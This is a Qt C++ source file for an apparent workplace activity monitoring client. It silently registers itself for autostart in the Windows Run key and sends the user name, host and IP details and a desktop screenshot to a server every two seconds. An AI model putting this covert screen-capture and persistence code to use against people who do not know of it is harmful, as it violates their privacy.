#include <QApplication>
#include <QTcpSocket>
#include <QDateTime>
#include <QHostInfo>
#include <QNetworkInterface>
#include <QSysInfo>
#include <QTimer>
#include <QSettings>

#include <QPixmap>
#include <QBuffer>
#include <QScreen>

// Функция для создания клиента и установки соединения с сервером
void connectToServer()
{
    QTcpSocket *socket = new QTcpSocket();
    socket->connectToHost("localhost", 1234); // Укажите IP-адрес и порт сервера

    if (!socket->waitForConnected(5000))
    {
        socket->deleteLater();
        return;
    }

    // Получение текущего времени
    QDateTime currentTime = QDateTime::currentDateTime();
    QString timeString = currentTime.toString("yyyy-MM-dd hh:mm:ss");

    // Получение информации о домене, компьютере, IP-адресе и пользователе (как в предыдущем примере)
    QString domain = QHostInfo::localDomainName();
    QString computerName = QSysInfo::machineHostName();
    QString ipAddress;
    QList<QHostAddress> ipAddresses = QNetworkInterface::allAddresses();
    for (const QHostAddress &address : ipAddresses)
    {
        if (address.protocol() == QAbstractSocket::IPv4Protocol && address != QHostAddress::LocalHost)
        {
            ipAddress = address.toString();
            break;
        }
    }
    QString userName = qgetenv("USERNAME"); // Для Windows

    // Получение скриншота рабочего стола
    QScreen *primaryScreen = QGuiApplication::primaryScreen();
    QPixmap screenshot = primaryScreen->grabWindow(0);
    QPixmap scaledScreenshot = screenshot.scaled(384, 216);
    QByteArray screenshotData;
    QBuffer buffer(&screenshotData);
    buffer.open(QIODevice::WriteOnly);
    scaledScreenshot.save(&buffer, "PNG");

    // Создание строки данных, включающей время, домен, компьютер, IP-адрес и пользователя
    QString data = domain + computerName + ipAddress + userName +
                   "," + domain + "," + computerName + "," + ipAddress + "," + userName + "," + timeString + ",";

    // Отправка данных на сервер
    socket->write(data.toUtf8());
    socket->write(screenshotData);
    socket->waitForBytesWritten(5000);

    // Получение ответа от сервера
    socket->waitForReadyRead(5000);
    QByteArray response = socket->readAll();

    socket->disconnectFromHost();
    socket->deleteLater();
}

int main(int argc, char *argv[])
{
    QApplication a(argc, argv);

    QSettings settings("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", QSettings::NativeFormat);

    // Проверяем, есть ли уже настройка для автозапуска
    bool isAutoStartEnabled = settings.contains("monitoring-work-activity-client");

    if (!isAutoStartEnabled) {
        // Если настройка отсутствует, добавляем приложение в автозагрузку
        QString appPath = QApplication::applicationFilePath();
        settings.setValue("monitoring-work-activity-client", appPath);
    }

    // Установка таймера для повторного подключения к серверу
    QTimer timer;
    QObject::connect(&timer, &QTimer::timeout, &connectToServer);
    timer.start(2000); // Интервал повторного подключения (в миллисекундах)

    // Подключение к серверу при запуске клиента
    connectToServer();

    return a.exec();
}
